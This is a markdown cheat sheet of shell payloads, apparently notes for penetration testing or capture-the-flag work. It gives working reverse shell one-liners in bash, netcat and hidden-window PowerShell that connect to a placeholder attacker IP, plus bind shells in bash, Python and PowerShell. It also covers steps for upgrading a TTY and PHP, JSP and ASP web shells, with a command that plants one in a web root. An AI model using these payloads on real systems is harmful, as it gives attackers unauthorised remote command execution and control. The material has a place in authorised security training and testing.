---
title: Shells
---

# Reverse Shell

> Connects back to our system and gives us control through a reverse connection.

```bash
nc -lvnp 1234  # start a listener on attacker's computer

# -l: Listen mode, to wait for a connection to connect to us.
# -n: Disable DNS resolution and only connect from/to IPs, to speed up the connection.

bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Bind Shell

> Waits for us to connect to it and gives us control once we do.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

```bash
# connect using netcat from attack's computer
nc 10.10.10.1 1234
```

## Upgrading TTY

Once we connect to a shell through Netcat, we can only type and backspace, no arrow key or history.

We can map our terminal TTY with the remote TTY. There are multipel ways.

### Python/stty

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# then hit `ctrl+z` to background our shell and get back on our local terminal, and type the stty command

# ^Z
stty raw -echo

fg # bring back netcat shell
# `enter` to get back to our shell or input `reset`
# now we have a fully working TTY shell
```

To fix the UI, we need to figure out a few variables. Open another terminal window.

```bash
# get the variables
echo $TERM
stty size # 67 318

# go back to netcat and correct them
export TERM=xterm-256color
stty rows 67 columns 318

```

# Web Shell

> Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
> A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

## php

```php
<?php system($_REQUEST["cmd"]); ?>
```

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## asp

```asp
<% eval request("cmd") %>
```

